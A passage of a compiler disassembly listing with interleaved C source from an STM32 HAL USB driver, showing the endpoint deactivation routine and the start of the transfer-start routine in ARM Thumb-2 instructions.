 80065da:	781b      	ldrb	r3, [r3, #0]
 80065dc:	009b      	lsls	r3, r3, #2
 80065de:	4413      	add	r3, r2
 80065e0:	881b      	ldrh	r3, [r3, #0]
 80065e2:	b29b      	uxth	r3, r3
 80065e4:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80065e8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80065ec:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 80065f0:	687a      	ldr	r2, [r7, #4]
 80065f2:	683b      	ldr	r3, [r7, #0]
 80065f4:	781b      	ldrb	r3, [r3, #0]
 80065f6:	009b      	lsls	r3, r3, #2
 80065f8:	441a      	add	r2, r3
 80065fa:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 80065fe:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006602:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006606:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800660a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800660e:	b29b      	uxth	r3, r3
 8006610:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 8006612:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 8006616:	4618      	mov	r0, r3
 8006618:	3774      	adds	r7, #116	; 0x74
 800661a:	46bd      	mov	sp, r7
 800661c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006620:	4770      	bx	lr
 8006622:	bf00      	nop

08006624 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006624:	b480      	push	{r7}
 8006626:	b08d      	sub	sp, #52	; 0x34
 8006628:	af00      	add	r7, sp, #0
 800662a:	6078      	str	r0, [r7, #4]
 800662c:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 800662e:	683b      	ldr	r3, [r7, #0]
 8006630:	7b1b      	ldrb	r3, [r3, #12]
 8006632:	2b00      	cmp	r3, #0
 8006634:	f040 808e 	bne.w	8006754 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 8006638:	683b      	ldr	r3, [r7, #0]
 800663a:	785b      	ldrb	r3, [r3, #1]
 800663c:	2b00      	cmp	r3, #0
 800663e:	d044      	beq.n	80066ca <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006640:	687a      	ldr	r2, [r7, #4]
 8006642:	683b      	ldr	r3, [r7, #0]
 8006644:	781b      	ldrb	r3, [r3, #0]
 8006646:	009b      	lsls	r3, r3, #2
 8006648:	4413      	add	r3, r2
 800664a:	881b      	ldrh	r3, [r3, #0]
 800664c:	81bb      	strh	r3, [r7, #12]
 800664e:	89bb      	ldrh	r3, [r7, #12]
 8006650:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006654:	2b00      	cmp	r3, #0
 8006656:	d01b      	beq.n	8006690 <USB_DeactivateEndpoint+0x6c>
 8006658:	687a      	ldr	r2, [r7, #4]
 800665a:	683b      	ldr	r3, [r7, #0]
 800665c:	781b      	ldrb	r3, [r3, #0]
 800665e:	009b      	lsls	r3, r3, #2
 8006660:	4413      	add	r3, r2
 8006662:	881b      	ldrh	r3, [r3, #0]
 8006664:	b29b      	uxth	r3, r3
 8006666:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800666a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800666e:	817b      	strh	r3, [r7, #10]
 8006670:	687a      	ldr	r2, [r7, #4]
 8006672:	683b      	ldr	r3, [r7, #0]
 8006674:	781b      	ldrb	r3, [r3, #0]
 8006676:	009b      	lsls	r3, r3, #2
 8006678:	441a      	add	r2, r3
 800667a:	897b      	ldrh	r3, [r7, #10]
 800667c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006680:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006684:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006688:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800668c:	b29b      	uxth	r3, r3
 800668e:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006690:	687a      	ldr	r2, [r7, #4]
 8006692:	683b      	ldr	r3, [r7, #0]
 8006694:	781b      	ldrb	r3, [r3, #0]
 8006696:	009b      	lsls	r3, r3, #2
 8006698:	4413      	add	r3, r2
 800669a:	881b      	ldrh	r3, [r3, #0]
 800669c:	b29b      	uxth	r3, r3
 800669e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066a2:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80066a6:	813b      	strh	r3, [r7, #8]
 80066a8:	687a      	ldr	r2, [r7, #4]
 80066aa:	683b      	ldr	r3, [r7, #0]
 80066ac:	781b      	ldrb	r3, [r3, #0]
 80066ae:	009b      	lsls	r3, r3, #2
 80066b0:	441a      	add	r2, r3
 80066b2:	893b      	ldrh	r3, [r7, #8]
 80066b4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066b8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066bc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066c0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80066c4:	b29b      	uxth	r3, r3
 80066c6:	8013      	strh	r3, [r2, #0]
 80066c8:	e192      	b.n	80069f0 <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80066ca:	687a      	ldr	r2, [r7, #4]
 80066cc:	683b      	ldr	r3, [r7, #0]
 80066ce:	781b      	ldrb	r3, [r3, #0]
 80066d0:	009b      	lsls	r3, r3, #2
 80066d2:	4413      	add	r3, r2
 80066d4:	881b      	ldrh	r3, [r3, #0]
 80066d6:	827b      	strh	r3, [r7, #18]
 80066d8:	8a7b      	ldrh	r3, [r7, #18]
 80066da:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80066de:	2b00      	cmp	r3, #0
 80066e0:	d01b      	beq.n	800671a <USB_DeactivateEndpoint+0xf6>
 80066e2:	687a      	ldr	r2, [r7, #4]
 80066e4:	683b      	ldr	r3, [r7, #0]
 80066e6:	781b      	ldrb	r3, [r3, #0]
 80066e8:	009b      	lsls	r3, r3, #2
 80066ea:	4413      	add	r3, r2
 80066ec:	881b      	ldrh	r3, [r3, #0]
 80066ee:	b29b      	uxth	r3, r3
 80066f0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066f4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066f8:	823b      	strh	r3, [r7, #16]
 80066fa:	687a      	ldr	r2, [r7, #4]
 80066fc:	683b      	ldr	r3, [r7, #0]
 80066fe:	781b      	ldrb	r3, [r3, #0]
 8006700:	009b      	lsls	r3, r3, #2
 8006702:	441a      	add	r2, r3
 8006704:	8a3b      	ldrh	r3, [r7, #16]
 8006706:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800670a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800670e:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006712:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006716:	b29b      	uxth	r3, r3
 8006718:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 800671a:	687a      	ldr	r2, [r7, #4]
 800671c:	683b      	ldr	r3, [r7, #0]
 800671e:	781b      	ldrb	r3, [r3, #0]
 8006720:	009b      	lsls	r3, r3, #2
 8006722:	4413      	add	r3, r2
 8006724:	881b      	ldrh	r3, [r3, #0]
 8006726:	b29b      	uxth	r3, r3
 8006728:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800672c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006730:	81fb      	strh	r3, [r7, #14]
 8006732:	687a      	ldr	r2, [r7, #4]
 8006734:	683b      	ldr	r3, [r7, #0]
 8006736:	781b      	ldrb	r3, [r3, #0]
 8006738:	009b      	lsls	r3, r3, #2
 800673a:	441a      	add	r2, r3
 800673c:	89fb      	ldrh	r3, [r7, #14]
 800673e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006742:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006746:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800674a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800674e:	b29b      	uxth	r3, r3
 8006750:	8013      	strh	r3, [r2, #0]
 8006752:	e14d      	b.n	80069f0 <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 8006754:	683b      	ldr	r3, [r7, #0]
 8006756:	785b      	ldrb	r3, [r3, #1]
 8006758:	2b00      	cmp	r3, #0
 800675a:	f040 80a5 	bne.w	80068a8 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800675e:	687a      	ldr	r2, [r7, #4]
 8006760:	683b      	ldr	r3, [r7, #0]
 8006762:	781b      	ldrb	r3, [r3, #0]
 8006764:	009b      	lsls	r3, r3, #2
 8006766:	4413      	add	r3, r2
 8006768:	881b      	ldrh	r3, [r3, #0]
 800676a:	843b      	strh	r3, [r7, #32]
 800676c:	8c3b      	ldrh	r3, [r7, #32]
 800676e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006772:	2b00      	cmp	r3, #0
 8006774:	d01b      	beq.n	80067ae <USB_DeactivateEndpoint+0x18a>
 8006776:	687a      	ldr	r2, [r7, #4]
 8006778:	683b      	ldr	r3, [r7, #0]
 800677a:	781b      	ldrb	r3, [r3, #0]
 800677c:	009b      	lsls	r3, r3, #2
 800677e:	4413      	add	r3, r2
 8006780:	881b      	ldrh	r3, [r3, #0]
 8006782:	b29b      	uxth	r3, r3
 8006784:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006788:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800678c:	83fb      	strh	r3, [r7, #30]
 800678e:	687a      	ldr	r2, [r7, #4]
 8006790:	683b      	ldr	r3, [r7, #0]
 8006792:	781b      	ldrb	r3, [r3, #0]
 8006794:	009b      	lsls	r3, r3, #2
 8006796:	441a      	add	r2, r3
 8006798:	8bfb      	ldrh	r3, [r7, #30]
 800679a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800679e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067a2:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80067a6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067aa:	b29b      	uxth	r3, r3
 80067ac:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80067ae:	687a      	ldr	r2, [r7, #4]
 80067b0:	683b      	ldr	r3, [r7, #0]
 80067b2:	781b      	ldrb	r3, [r3, #0]
 80067b4:	009b      	lsls	r3, r3, #2
 80067b6:	4413      	add	r3, r2
 80067b8:	881b      	ldrh	r3, [r3, #0]
 80067ba:	83bb      	strh	r3, [r7, #28]
 80067bc:	8bbb      	ldrh	r3, [r7, #28]
 80067be:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80067c2:	2b00      	cmp	r3, #0
 80067c4:	d01b      	beq.n	80067fe <USB_DeactivateEndpoint+0x1da>
 80067c6:	687a      	ldr	r2, [r7, #4]
 80067c8:	683b      	ldr	r3, [r7, #0]
 80067ca:	781b      	ldrb	r3, [r3, #0]
 80067cc:	009b      	lsls	r3, r3, #2
 80067ce:	4413      	add	r3, r2
 80067d0:	881b      	ldrh	r3, [r3, #0]
 80067d2:	b29b      	uxth	r3, r3
 80067d4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80067d8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067dc:	837b      	strh	r3, [r7, #26]
 80067de:	687a      	ldr	r2, [r7, #4]
 80067e0:	683b      	ldr	r3, [r7, #0]
 80067e2:	781b      	ldrb	r3, [r3, #0]
 80067e4:	009b      	lsls	r3, r3, #2
 80067e6:	441a      	add	r2, r3
 80067e8:	8b7b      	ldrh	r3, [r7, #26]
 80067ea:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067ee:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067f2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067f6:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80067fa:	b29b      	uxth	r3, r3
 80067fc:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 80067fe:	687a      	ldr	r2, [r7, #4]
 8006800:	683b      	ldr	r3, [r7, #0]
 8006802:	781b      	ldrb	r3, [r3, #0]
 8006804:	009b      	lsls	r3, r3, #2
 8006806:	4413      	add	r3, r2
 8006808:	881b      	ldrh	r3, [r3, #0]
 800680a:	b29b      	uxth	r3, r3
 800680c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006810:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006814:	833b      	strh	r3, [r7, #24]
 8006816:	687a      	ldr	r2, [r7, #4]
 8006818:	683b      	ldr	r3, [r7, #0]
 800681a:	781b      	ldrb	r3, [r3, #0]
 800681c:	009b      	lsls	r3, r3, #2
 800681e:	441a      	add	r2, r3
 8006820:	8b3b      	ldrh	r3, [r7, #24]
 8006822:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006826:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800682a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800682e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006832:	b29b      	uxth	r3, r3
 8006834:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006836:	687a      	ldr	r2, [r7, #4]
 8006838:	683b      	ldr	r3, [r7, #0]
 800683a:	781b      	ldrb	r3, [r3, #0]
 800683c:	009b      	lsls	r3, r3, #2
 800683e:	4413      	add	r3, r2
 8006840:	881b      	ldrh	r3, [r3, #0]
 8006842:	b29b      	uxth	r3, r3
 8006844:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006848:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800684c:	82fb      	strh	r3, [r7, #22]
 800684e:	687a      	ldr	r2, [r7, #4]
 8006850:	683b      	ldr	r3, [r7, #0]
 8006852:	781b      	ldrb	r3, [r3, #0]
 8006854:	009b      	lsls	r3, r3, #2
 8006856:	441a      	add	r2, r3
 8006858:	8afb      	ldrh	r3, [r7, #22]
 800685a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800685e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006862:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006866:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800686a:	b29b      	uxth	r3, r3
 800686c:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800686e:	687a      	ldr	r2, [r7, #4]
 8006870:	683b      	ldr	r3, [r7, #0]
 8006872:	781b      	ldrb	r3, [r3, #0]
 8006874:	009b      	lsls	r3, r3, #2
 8006876:	4413      	add	r3, r2
 8006878:	881b      	ldrh	r3, [r3, #0]
 800687a:	b29b      	uxth	r3, r3
 800687c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006880:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006884:	82bb      	strh	r3, [r7, #20]
 8006886:	687a      	ldr	r2, [r7, #4]
 8006888:	683b      	ldr	r3, [r7, #0]
 800688a:	781b      	ldrb	r3, [r3, #0]
 800688c:	009b      	lsls	r3, r3, #2
 800688e:	441a      	add	r2, r3
 8006890:	8abb      	ldrh	r3, [r7, #20]
 8006892:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006896:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800689a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800689e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068a2:	b29b      	uxth	r3, r3
 80068a4:	8013      	strh	r3, [r2, #0]
 80068a6:	e0a3      	b.n	80069f0 <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80068a8:	687a      	ldr	r2, [r7, #4]
 80068aa:	683b      	ldr	r3, [r7, #0]
 80068ac:	781b      	ldrb	r3, [r3, #0]
 80068ae:	009b      	lsls	r3, r3, #2
 80068b0:	4413      	add	r3, r2
 80068b2:	881b      	ldrh	r3, [r3, #0]
 80068b4:	85fb      	strh	r3, [r7, #46]	; 0x2e
 80068b6:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 80068b8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80068bc:	2b00      	cmp	r3, #0
 80068be:	d01b      	beq.n	80068f8 <USB_DeactivateEndpoint+0x2d4>
 80068c0:	687a      	ldr	r2, [r7, #4]
 80068c2:	683b      	ldr	r3, [r7, #0]
 80068c4:	781b      	ldrb	r3, [r3, #0]
 80068c6:	009b      	lsls	r3, r3, #2
 80068c8:	4413      	add	r3, r2
 80068ca:	881b      	ldrh	r3, [r3, #0]
 80068cc:	b29b      	uxth	r3, r3
 80068ce:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068d2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068d6:	85bb      	strh	r3, [r7, #44]	; 0x2c
 80068d8:	687a      	ldr	r2, [r7, #4]
 80068da:	683b      	ldr	r3, [r7, #0]
 80068dc:	781b      	ldrb	r3, [r3, #0]
 80068de:	009b      	lsls	r3, r3, #2
 80068e0:	441a      	add	r2, r3
 80068e2:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 80068e4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068e8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068ec:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80068f0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068f4:	b29b      	uxth	r3, r3
 80068f6:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80068f8:	687a      	ldr	r2, [r7, #4]
 80068fa:	683b      	ldr	r3, [r7, #0]
 80068fc:	781b      	ldrb	r3, [r3, #0]
 80068fe:	009b      	lsls	r3, r3, #2
 8006900:	4413      	add	r3, r2
 8006902:	881b      	ldrh	r3, [r3, #0]
 8006904:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006906:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006908:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800690c:	2b00      	cmp	r3, #0
 800690e:	d01b      	beq.n	8006948 <USB_DeactivateEndpoint+0x324>
 8006910:	687a      	ldr	r2, [r7, #4]
 8006912:	683b      	ldr	r3, [r7, #0]
 8006914:	781b      	ldrb	r3, [r3, #0]
 8006916:	009b      	lsls	r3, r3, #2
 8006918:	4413      	add	r3, r2
 800691a:	881b      	ldrh	r3, [r3, #0]
 800691c:	b29b      	uxth	r3, r3
 800691e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006922:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006926:	853b      	strh	r3, [r7, #40]	; 0x28
 8006928:	687a      	ldr	r2, [r7, #4]
 800692a:	683b      	ldr	r3, [r7, #0]
 800692c:	781b      	ldrb	r3, [r3, #0]
 800692e:	009b      	lsls	r3, r3, #2
 8006930:	441a      	add	r2, r3
 8006932:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8006934:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006938:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800693c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006940:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006944:	b29b      	uxth	r3, r3
 8006946:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 8006948:	687a      	ldr	r2, [r7, #4]
 800694a:	683b      	ldr	r3, [r7, #0]
 800694c:	781b      	ldrb	r3, [r3, #0]
 800694e:	009b      	lsls	r3, r3, #2
 8006950:	4413      	add	r3, r2
 8006952:	881b      	ldrh	r3, [r3, #0]
 8006954:	b29b      	uxth	r3, r3
 8006956:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800695a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800695e:	84fb      	strh	r3, [r7, #38]	; 0x26
 8006960:	687a      	ldr	r2, [r7, #4]
 8006962:	683b      	ldr	r3, [r7, #0]
 8006964:	781b      	ldrb	r3, [r3, #0]
 8006966:	009b      	lsls	r3, r3, #2
 8006968:	441a      	add	r2, r3
 800696a:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800696c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006970:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006974:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006978:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800697c:	b29b      	uxth	r3, r3
 800697e:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006980:	687a      	ldr	r2, [r7, #4]
 8006982:	683b      	ldr	r3, [r7, #0]
 8006984:	781b      	ldrb	r3, [r3, #0]
 8006986:	009b      	lsls	r3, r3, #2
 8006988:	4413      	add	r3, r2
 800698a:	881b      	ldrh	r3, [r3, #0]
 800698c:	b29b      	uxth	r3, r3
 800698e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006992:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006996:	84bb      	strh	r3, [r7, #36]	; 0x24
 8006998:	687a      	ldr	r2, [r7, #4]
 800699a:	683b      	ldr	r3, [r7, #0]
 800699c:	781b      	ldrb	r3, [r3, #0]
 800699e:	009b      	lsls	r3, r3, #2
 80069a0:	441a      	add	r2, r3
 80069a2:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 80069a4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069a8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069ac:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069b0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069b4:	b29b      	uxth	r3, r3
 80069b6:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80069b8:	687a      	ldr	r2, [r7, #4]
 80069ba:	683b      	ldr	r3, [r7, #0]
 80069bc:	781b      	ldrb	r3, [r3, #0]
 80069be:	009b      	lsls	r3, r3, #2
 80069c0:	4413      	add	r3, r2
 80069c2:	881b      	ldrh	r3, [r3, #0]
 80069c4:	b29b      	uxth	r3, r3
 80069c6:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80069ca:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069ce:	847b      	strh	r3, [r7, #34]	; 0x22
 80069d0:	687a      	ldr	r2, [r7, #4]
 80069d2:	683b      	ldr	r3, [r7, #0]
 80069d4:	781b      	ldrb	r3, [r3, #0]
 80069d6:	009b      	lsls	r3, r3, #2
 80069d8:	441a      	add	r2, r3
 80069da:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 80069dc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069e0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069e4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069e8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069ec:	b29b      	uxth	r3, r3
 80069ee:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 80069f0:	2300      	movs	r3, #0
}
 80069f2:	4618      	mov	r0, r3
 80069f4:	3734      	adds	r7, #52	; 0x34
 80069f6:	46bd      	mov	sp, r7
 80069f8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80069fc:	4770      	bx	lr

080069fe <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80069fe:	b580      	push	{r7, lr}
 8006a00:	b0c2      	sub	sp, #264	; 0x108
 8006a02:	af00      	add	r7, sp, #0
 8006a04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a08:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006a0c:	6018      	str	r0, [r3, #0]
 8006a0e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a12:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a16:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006a18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a1c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a20:	681b      	ldr	r3, [r3, #0]
 8006a22:	785b      	ldrb	r3, [r3, #1]
 8006a24:	2b01      	cmp	r3, #1
 8006a26:	f040 86b7 	bne.w	8007798 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006a2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a32:	681b      	ldr	r3, [r3, #0]
 8006a34:	699a      	ldr	r2, [r3, #24]
 8006a36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a3e:	681b      	ldr	r3, [r3, #0]
 8006a40:	691b      	ldr	r3, [r3, #16]
 8006a42:	429a      	cmp	r2, r3
 8006a44:	d908      	bls.n	8006a58 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006a46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a4a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a4e:	681b      	ldr	r3, [r3, #0]
 8006a50:	691b      	ldr	r3, [r3, #16]
 8006a52:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006a56:	e007      	b.n	8006a68 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006a58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a5c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a60:	681b      	ldr	r3, [r3, #0]
 8006a62:	699b      	ldr	r3, [r3, #24]
 8006a64:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006a68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a6c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a70:	681b      	ldr	r3, [r3, #0]
 8006a72:	7b1b      	ldrb	r3, [r3, #12]
 8006a74:	2b00      	cmp	r3, #0
 8006a76:	d13a      	bne.n	8006aee <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006a78:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a7c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a80:	681b      	ldr	r3, [r3, #0]
 8006a82:	6959      	ldr	r1, [r3, #20]
 8006a84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a88:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a8c:	681b      	ldr	r3, [r3, #0]
 8006a8e:	88da      	ldrh	r2, [r3, #6]
 8006a90:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006a94:	b29b      	uxth	r3, r3
 8006a96:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006a9a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006a9e:	6800      	ldr	r0, [r0, #0]
 8006aa0:	f001 fcb9 	bl	8008416 <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006aa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006aa8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006aac:	681b      	ldr	r3, [r3, #0]
 8006aae:	613b      	str	r3, [r7, #16]
 8006ab0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ab4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ab8:	681b      	ldr	r3, [r3, #0]
